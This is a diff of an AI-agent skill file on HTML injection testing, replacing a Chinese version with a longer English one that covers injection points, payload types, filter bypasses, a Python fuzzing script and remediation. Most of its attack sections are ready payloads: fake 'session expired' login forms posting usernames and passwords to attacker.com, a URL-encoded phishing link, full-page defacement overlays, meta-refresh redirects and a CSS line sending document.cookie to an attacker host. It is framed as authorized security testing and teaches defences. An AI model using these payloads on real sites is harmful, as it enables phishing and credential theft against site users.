@@ -1,14 +1,14 @@
 ---
 name: html-injection-testing
-title: HTML 注入测试
-description: 当对授权 Web 目标做应用安全测试、需识别用户输入未经转义直接渲染导致的 HTML 注入时使用；做注入点定位、payload 构造与利用（钓鱼表单/篡改/重定向）并产出漏洞报告与修复建议；不适用于未授权目标、纯 JS 执行型 XSS 深挖或前端渲染调试。触发词：HTML 注入、HTML injection、钓鱼表单、页面篡改、输出转义
+title: HTML Injection Testing
+description: Identify and exploit HTML injection vulnerabilities that allow attackers to inject malicious HTML content into web applications. This vulnerability enables attackers to modify page appearance, create phishing pages, and steal user credentials through injected forms.
 domain: 安全/appsec
-triggers: [HTML 注入, HTML injection, 钓鱼表单注入, 页面篡改 defacement, 反射型/存储型 HTML 注入, 输出未转义, meta refresh 重定向注入]
-tags: [安全, appsec, web安全, 注入, 渗透测试, 钓鱼, xss相关]
-level: 进阶
+triggers: [HTML injection]
+tags: [appsec]
+level: intermediate
 status: stable
 agents: [claude-code, codex, cursor, gemini-cli]
-tools: [curl, Burp Suite, OWASP ZAP, 浏览器开发者工具, Python requests]
+tools: []
 requires: []
 related: [path-traversal-testing, idor-vulnerability-testing, broken-authentication-testing, burp-suite-testing]
 combines_with: [burp-suite-testing, penetration-testing-methodology, api-fuzzing-bug-bounty]
@@ -16,95 +16,152 @@ license: MIT
 source: sickn33/antigravity-awesome-skills
 source_license: MIT
 ---
-> 仅限授权使用：仅在获得授权的安全评估、防御验证或受控教学环境中使用本技能。
+> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.
 
-## 何时使用
+# HTML Injection Testing
 
-当你在**已获授权**的 Web 应用上做应用安全测试，怀疑用户输入被未经清洗/转义地反射或存储到页面 HTML 中，需要确认是否存在 HTML 注入并评估其危害（篡改、钓鱼、凭据窃取）时使用。
+## Purpose
 
-先分清 HTML 注入与 XSS：
-- HTML 注入：只渲染 HTML 标签（如 `<h1>`、`<form>`、`<img>`），不执行脚本。
-- XSS：可执行 JavaScript。
-- HTML 注入常是通往 XSS 的跳板；即便脚本被过滤，仍可借表单/`meta refresh` 实施钓鱼。
+Identify and exploit HTML injection vulnerabilities that allow attackers to inject malicious HTML content into web applications. This vulnerability enables attackers to modify page appearance, create phishing pages, and steal user credentials through injected forms.
 
-**不该用边界**：
-- 未取得书面授权的任何目标——不要碰。
-- 目标已确认存在脚本执行（纯 XSS 利用/绕过 CSP 执行 JS）应转向 XSS 专项，本技能聚焦标签渲染层面。
-- 仅排查自家前端渲染 bug、与安全无关，无需本流程。
+## Prerequisites
 
-## 步骤
+### Required Tools
+- Web browser with developer tools
+- Burp Suite or OWASP ZAP
+- Tamper Data or similar proxy
+- cURL for testing payloads
 
-1. **定位注入点**：盘点会回显输入的位置——搜索框与结果、评论区、用户资料、联系/反馈/注册表单、被回显的 URL 参数、错误消息、页面标题、隐藏字段、被回显的 Cookie。
-   常见可疑参数：`name`、`user`、`search`、`query`、`message`、`title`、`content`、`redirect`、`url`、`page`。
-2. **基础探测**：注入简单标签，确认是否被当作 HTML 渲染而非转义文本。
-3. **判定注入类型**：存储型（入库持久化）/ 反射型 GET（URL 参数）/ 反射型 POST（表单体）/ URL 路径回显型。
-4. **构造利用**：按目标场景构造钓鱼表单、页面篡改覆盖层，或 CSS/meta/iframe/表单 action 等进阶 payload。
-5. **绕过过滤**：遇到过滤时尝试大小写变形、HTML 实体/URL/双重/Unicode 编码、标签拆分、空字节、属性事件等。
-6. **批量/自动化**：用 Burp Intruder、ZAP 主动扫描或自写 fuzz 脚本扩大覆盖，再**人工验证**每个命中。
-7. **出报告**：注入点清单、利用证据（内容被操纵的截图/响应）、危害评估（钓鱼/篡改/凭据窃取）、修复建议。
+### Required Knowledge
+- HTML fundamentals
+- HTTP request/response structure
+- Web application input handling
+- Difference between HTML injection and XSS
 
-## 指令
+## Outputs and Deliverables
 
-基础渲染探测（确认 HTML 是否被渲染，而非以转义文本回显）：
+1. **Vulnerability Report** - Identified injection points
+2. **Exploitation Proof** - Demonstrated content manipulation
+3. **Impact Assessment** - Potential phishing and defacement risks
+4. **Remediation Guidance** - Input validation recommendations
 
+## Core Workflow
+
+### Phase 1: Understanding HTML Injection
+
+HTML injection occurs when user input is reflected in web pages without proper sanitization:
+
+```html
+<!-- Vulnerable code example -->
+<div>
+    Welcome, <?php echo $_GET['name']; ?>
+</div>
+
+<!-- Attack input -->
+?name=<h1>Injected Content</h1>
+
+<!-- Rendered output -->
+<div>
+    Welcome, <h1>Injected Content</h1>
+</div>
+```
+
+Key differences from XSS:
+- HTML injection: Only HTML tags are rendered
+- XSS: JavaScript code is executed
+- HTML injection is often stepping stone to XSS
+
+Attack goals:
+- Modify website appearance (defacement)
+- Create fake login forms (phishing)
+- Inject malicious links
+- Display misleading content
+
+### Phase 2: Identifying Injection Points
+
+Map application for potential injection surfaces:
+
+```
+1. Search bars and search results
+2. Comment sections
+3. User profile fields
+4. Contact forms and feedback
+5. Registration forms
+6. URL parameters reflected on page
+7. Error messages
+8. Page titles and headers
+9. Hidden form fields
+10. Cookie values reflected on page
+```
+
+Common vulnerable parameters:
+```
+?name=
+?user=
+?search=
+?query=
+?message=
+?title=
+?content=
+?redirect=
+?url=
+?page=
+```
+
+### Phase 3: Basic HTML Injection Testing
+
+Test with simple HTML tags:
+
+```html
+<!-- Basic text formatting -->
+<h1>Test Injection</h1>
+<b>Bold Text</b>
+<i>Italic Text</i>
+<u>Underlined Text</u>
+<font color="red">Red Text</font>
+
+<!-- Structural elements -->
+<div style="background:red;color:white;padding:10px">Injected DIV</div>
+<p>Injected paragraph</p>
+<br><br><br>Line breaks
+
+<!-- Links -->
+<a href="http://attacker.com">Click Here</a>
+<a href="http://attacker.com">Legitimate Link</a>
+
+<!-- Images -->
+<img src="http://attacker.com/image.png">
+<img src="x" onerror="alert(1)">  <!-- XSS attempt -->
+```
+
+Testing workflow:
 ```bash
-# 基本注入
+# Test basic injection
 curl "http://target.com/search?q=<h1>Test</h1>"
-# 检查响应中是否渲染了 HTML
+
+# Check if HTML renders in response
 curl -s "http://target.com/search?q=<b>Bold</b>" | grep -i "bold"
-# URL 编码形式
+
+# Test in URL-encoded form
 curl "http://target.com/search?q=%3Ch1%3ETest%3C%2Fh1%3E"
 ```
 
-反射型 POST 探测：
+### Phase 4: Types of HTML Injection
 
-```bash
-curl -X POST -d "comment=<div style='color:red'>Malicious Content</div>" http://target.com/submit
-```
+#### Stored HTML Injection
 
-简单 fuzz 脚本（命中后必须人工复核）：
-
-```python
-#!/usr/bin/env python3
-import requests, urllib.parse
-target, param = "http://target.com/search", "q"
-payloads = [
-    "<h1>Test</h1>", "<b>Bold</b>", "<script>alert(1)</script>",
-    "<img src=x onerror=alert(1)>", "<a href='http://evil.com'>Click</a>",
-    "<div style='color:red'>Styled</div>", "<marquee>Moving</marquee>",
-    "<iframe src='http://evil.com'></iframe>",
-]
-for p in payloads:
-    url = f"{target}?{param}={urllib.parse.quote(p)}"
-    try:
-        r = requests.get(url, timeout=5)
-        if p.lower() in r.text.lower():
-            print(f"[+] Possible injection: {p}")
-        elif "<h1>" in r.text or "<b>" in r.text:
-            print(f"[?] Partial reflection: {p}")
-    except Exception as e:
-        print(f"[-] Error: {e}")
-```
-
-自动化扫描器：
-- Burp：抓含注入点的请求 → Send to Intruder → 标记参数为 payload 位 → 载入 HTML 注入字典 → 跑 → 过滤已渲染 HTML 的响应 → 人工验证。
-- ZAP：Spider 爬取 → 用 HTML 注入规则做 Active Scan → 复核 Alerts → 人工验证。
-
-## 示例
-
-基础渲染测试 payload：
+Payload persists in database:
 
 ```html
-<h1>Test Injection</h1>
-<b>Bold Text</b>
-<div style="background:red;color:white;padding:10px">Injected DIV</div>
-<a href="http://attacker.com">Click Here</a>
-<img src="http://attacker.com/image.png">
-```
+<!-- Profile bio injection -->
+Name: John Doe
+Bio: <div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;">
+     <h1>Site Under Maintenance</h1>
+     <p>Please login at <a href="http://attacker.com/login">portal.company.com</a></p>
+     </div>
 
-存储型钓鱼表单（如注入到评论/资料 bio，伪造会话过期登录框）：
-
-```html
+<!-- Comment injection -->
+Great article!
 <form action="http://attacker.com/steal" method="POST">
     <input name="username" placeholder="Session expired. Enter username:">
     <input name="password" type="password" placeholder="Password:">
@@ -112,54 +169,345 @@ for p in payloads:
 </form>
 ```
 
-反射型 GET（URL 参数）：
+#### Reflected GET Injection
 
-```text
+Payload in URL parameters:
+
+```html
+<!-- URL injection -->
+http://target.com/welcome?name=<h1>Welcome%20Admin</h1><form%20action="http://attacker.com/steal">
+
+<!-- Search result injection -->
 http://target.com/search?q=<marquee>Your%20account%20has%20been%20compromised</marquee>
 ```
 
-页面篡改（全屏覆盖层）：
+#### Reflected POST Injection
+
+Payload in POST data:
+
+```bash
+# POST injection test
+curl -X POST -d "comment=<div style='color:red'>Malicious Content</div>" \
+     http://target.com/submit
+
+# Form field injection
+curl -X POST -d "name=<script>alert(1)</script>&email=test@test.com" \
+     http://target.com/register
+```
+
+#### URL-Based Injection
+
+Inject into displayed URLs:
 
 ```html
+<!-- If URL is displayed on page -->
+http://target.com/page/<h1>Injected</h1>
+
+<!-- Path-based injection -->
+http://target.com/users/<img src=x>/profile
+```
+
+### Phase 5: Phishing Attack Construction
+
+Create convincing phishing forms:
+
+```html
+<!-- Fake login form overlay -->
+<div style="position:fixed;top:0;left:0;width:100%;height:100%;
+            background:white;z-index:9999;padding:50px;">
+    <h2>Session Expired</h2>
+    <p>Your session has expired. Please log in again.</p>
+    <form action="http://attacker.com/capture" method="POST">
+        <label>Username:</label><br>
+        <input type="text" name="username" style="width:200px;"><br><br>
+        <label>Password:</label><br>
+        <input type="password" name="password" style="width:200px;"><br><br>
+        <input type="submit" value="Login">
+    </form>
+</div>
+
+<!-- Hidden credential stealer -->
+<style>
+    input { background: url('http://attacker.com/log?data=') }
+</style>
+<form action="http://attacker.com/steal" method="POST">
+    <input name="user" placeholder="Verify your username">
+    <input name="pass" type="password" placeholder="Verify your password">
+    <button>Verify</button>
+</form>
+```
+
+URL-encoded phishing link:
+```
+http://target.com/page?msg=%3Cdiv%20style%3D%22position%3Afixed%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%3Bbackground%3Awhite%3Bz-index%3A9999%3Bpadding%3A50px%3B%22%3E%3Ch2%3ESession%20Expired%3C%2Fh2%3E%3Cform%20action%3D%22http%3A%2F%2Fattacker.com%2Fcapture%22%3E%3Cinput%20name%3D%22user%22%20placeholder%3D%22Username%22%3E%3Cinput%20name%3D%22pass%22%20type%3D%22password%22%3E%3Cbutton%3ELogin%3C%2Fbutton%3E%3C%2Fform%3E%3C%2Fdiv%3E
+```
+
+### Phase 6: Defacement Payloads
+
+Website appearance manipulation:
+
+```html
+<!-- Full page overlay -->
 <div style="position:fixed;top:0;left:0;width:100%;height:100%;
             background:#000;color:#0f0;z-index:9999;
             display:flex;justify-content:center;align-items:center;">
     <h1>HACKED BY SECURITY TESTER</h1>
 </div>
+
+<!-- Content replacement -->
+<style>body{display:none}</style>
+<body style="display:block !important">
+    <h1>This site has been compromised</h1>
+</body>
+
+<!-- Image injection -->
+<img src="http://attacker.com/defaced.jpg" 
+     style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">
+
+<!-- Marquee injection (visible movement) -->
+<marquee behavior="alternate" style="font-size:50px;color:red;">
+    SECURITY VULNERABILITY DETECTED
+</marquee>
 ```
 
-进阶：meta refresh 重定向 / iframe 注入：
+### Phase 7: Advanced Injection Techniques
+
+#### CSS Injection
 
 ```html
+<!-- Style injection -->
+<style>
+    body { background: url('http://attacker.com/track?cookie='+document.cookie) }
+    .content { display: none }
+    .fake-content { display: block }
+</style>
+
+<!-- Inline style injection -->
+<div style="background:url('http://attacker.com/log')">Content</div>
+```
+
+#### Meta Tag Injection
+
+```html
+<!-- Redirect via meta refresh -->
 <meta http-equiv="refresh" content="0;url=http://attacker.com/phish">
+
+<!-- CSP bypass attempt -->
+<meta http-equiv="Content-Security-Policy" content="default-src *">
+```
+
+#### Form Action Override
+
+```html
+<!-- Hijack existing form -->
+<form action="http://attacker.com/steal">
+
+<!-- If form already exists, add input -->
+<input type="hidden" name="extra" value="data">
+</form>
+```
+
+#### iframe Injection
+
+```html
+<!-- Embed external content -->
+<iframe src="http://attacker.com/malicious" width="100%" height="500"></iframe>
+
+<!-- Invisible tracking iframe -->
 <iframe src="http://attacker.com/track" style="display:none"></iframe>
 ```
 
-过滤绕过样例：
+### Phase 8: Bypass Techniques
+
+Evade basic filters:
 
 ```html
-<H1>Test</H1>                          <!-- 大小写变形 -->
-&#60;h1&#62;Encoded&#60;/h1&#62;        <!-- HTML 实体 -->
-%253Ch1%253EDouble%253C%252Fh1%253E    <!-- 双重编码 -->
+<!-- Case variations -->
+<H1>Test</H1>
+<ScRiPt>alert(1)</ScRiPt>
+
+<!-- Encoding variations -->
+&#60;h1&#62;Encoded&#60;/h1&#62;
+%3Ch1%3EURL%20Encoded%3C%2Fh1%3E
+
+<!-- Tag splitting -->
 <h
-1>Split Tag</h1>                       <!-- 标签拆分 -->
-<div onmouseover="alert(1)">Hover</div> <!-- 属性事件 -->
+1>Split Tag</h1>
+
+<!-- Null bytes -->
+<h1%00>Null Byte</h1>
+
+<!-- Double encoding -->
+%253Ch1%253EDouble%2520Encoded%253C%252Fh1%253E
+
+<!-- Unicode encoding -->
+\u003ch1\u003eUnicode\u003c/h1\u003e
+
+<!-- Attribute-based -->
+<div onmouseover="alert(1)">Hover me</div>
+<img src=x onerror=alert(1)>
 ```
 
-## 注意事项
+### Phase 9: Automated Testing
 
-- **授权第一**：无授权不测试，所有 payload 仅指向你掌控的回收端点（如 `attacker.com` 占位需替换为自己的测试服务器）。
-- **区分 HTML 注入与 XSS**：在浏览器中实测视觉影响，确认是「标签被渲染」还是「脚本被执行」，并据此定级与撰写报告。
-- **危害定级**：HTML 注入本身严重度低于 XSS（无脚本执行），但结合钓鱼/页面篡改可显著放大——评估凭据窃取与声誉损害。
-- **现实限制**：现代浏览器可能净化部分注入；CSP 可拦内联样式/脚本；WAF 可能拦常见 payload；输出做了正确转义则不可注入。
-- **排错**：HTML 未渲染→检查是否被 HTML 编码、换编码变体、确认注入上下文；payload 被剥离→试编码变体/标签拆分/空字节/嵌套标签；HTML 通但 JS 不通→转用钓鱼表单与 meta refresh 重定向。
-- **修复建议**（写入报告）：输出做上下文感知转义（PHP `htmlspecialchars($x, ENT_QUOTES, 'UTF-8')` 或 `strip_tags`；Python `html.escape`，Jinja2 默认自动转义、慎用 `| safe`；JS 用 `textContent` 而非 `innerHTML`，必须富文本则 `DOMPurify.sanitize`）；辅以输入白名单校验、CSP 头、WAF 规则。
+#### Using Burp Suite
 
-## 互见
+```
+1. Capture request with potential injection point
+2. Send to Intruder
+3. Mark parameter value as payload position
+4. Load HTML injection wordlist
+5. Start attack
+6. Filter responses for rendered HTML
+7. Manually verify successful injections
+```
 
-- XSS 测试（脚本执行型注入，HTML 注入的进阶方向）
-- CSP 配置与绕过
-- 输入校验与输出编码（防御侧）
+#### Using OWASP ZAP
 
----
-采编自 sickn33/antigravity-awesome-skills（MIT），原作者 zebbern。
+```
+1. Spider the target application
+2. Active Scan with HTML injection rules
+3. Review Alerts for injection findings
+4. Validate findings manually
+```
+
+#### Custom Fuzzing Script
+
+```python
+#!/usr/bin/env python3
+import requests
+import urllib.parse
+
+target = "http://target.com/search"
+param = "q"
+
+payloads = [
+    "<h1>Test</h1>",
+    "<b>Bold</b>",
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "<a href='http://evil.com'>Click</a>",
+    "<div style='color:red'>Styled</div>",
+    "<marquee>Moving</marquee>",
+    "<iframe src='http://evil.com'></iframe>",
+]
+
+for payload in payloads:
+    encoded = urllib.parse.quote(payload)
+    url = f"{target}?{param}={encoded}"
+    
+    try:
+        response = requests.get(url, timeout=5)
+        if payload.lower() in response.text.lower():
+            print(f"[+] Possible injection: {payload}")
+        elif "<h1>" in response.text or "<b>" in response.text:
+            print(f"[?] Partial reflection: {payload}")
+    except Exception as e:
+        print(f"[-] Error: {e}")
+```
+
+### Phase 10: Prevention and Remediation
+
+Secure coding practices:
+
+```php
+// PHP: Escape output
+echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
+
+// PHP: Strip tags
+echo strip_tags($user_input);
+
+// PHP: Allow specific tags only
+echo strip_tags($user_input, '<p><b><i>');
+```
+
+```python
+# Python: HTML escape
+from html import escape
+safe_output = escape(user_input)
+
+# Python Flask: Auto-escaping
+{{ user_input }}  # Jinja2 escapes by default
+{{ user_input | safe }}  # Marks as safe (dangerous!)
+```
+
+```javascript
+// JavaScript: Text content (safe)
+element.textContent = userInput;
+
+// JavaScript: innerHTML (dangerous!)
+element.innerHTML = userInput;  // Vulnerable!
+
+// JavaScript: Sanitize
+const clean = DOMPurify.sanitize(userInput);
+element.innerHTML = clean;
+```
+
+Server-side protections:
+- Input validation (whitelist allowed characters)
+- Output encoding (context-aware escaping)
+- Content Security Policy (CSP) headers
+- Web Application Firewall (WAF) rules
+
+## Quick Reference
+
+### Common Test Payloads
+
+| Payload | Purpose |
+|---------|---------|
+| `<h1>Test</h1>` | Basic rendering test |
+| `<b>Bold</b>` | Simple formatting |
+| `<a href="evil.com">Link</a>` | Link injection |
+| `<img src=x>` | Image tag test |
+| `<div style="color:red">` | Style injection |
+| `<form action="evil.com">` | Form hijacking |
+
+### Injection Contexts
+
+| Context | Test Approach |
+|---------|---------------|
+| URL parameter | `?param=<h1>test</h1>` |
+| Form field | POST with HTML payload |
+| Cookie value | Inject via document.cookie |
+| HTTP header | Inject in Referer/User-Agent |
+| File upload | HTML file with malicious content |
+
+### Encoding Types
+
+| Type | Example |
+|------|---------|
+| URL encoding | `%3Ch1%3E` = `<h1>` |
+| HTML entities | `&#60;h1&#62;` = `<h1>` |
+| Double encoding | `%253C` = `<` |
+| Unicode | `\u003c` = `<` |
+
+## Constraints and Limitations
+
+### Attack Limitations
+- Modern browsers may sanitize some injections
+- CSP can prevent inline styles and scripts
+- WAFs may block common payloads
+- Some applications escape output properly
+
+### Testing Considerations
+- Distinguish between HTML injection and XSS
+- Verify visual impact in browser
+- Test in multiple browsers
+- Check for stored vs reflected
+
+### Severity Assessment
+- Lower severity than XSS (no script execution)
+- Higher impact when combined with phishing
+- Consider defacement/reputation damage
+- Evaluate credential theft potential
+
+## Troubleshooting
+
+| Issue | Solutions |
+|-------|-----------|
+| HTML not rendering | Check if output HTML-encoded; try encoding variations; verify HTML context |
+| Payload stripped | Use encoding variations; try tag splitting; test null bytes; nested tags |
+| XSS not working (HTML only) | JS filtered but HTML allowed; leverage phishing forms, meta refresh redirects |
+
+## When to Use
+This skill is applicable to execute the workflow or actions described in the overview.
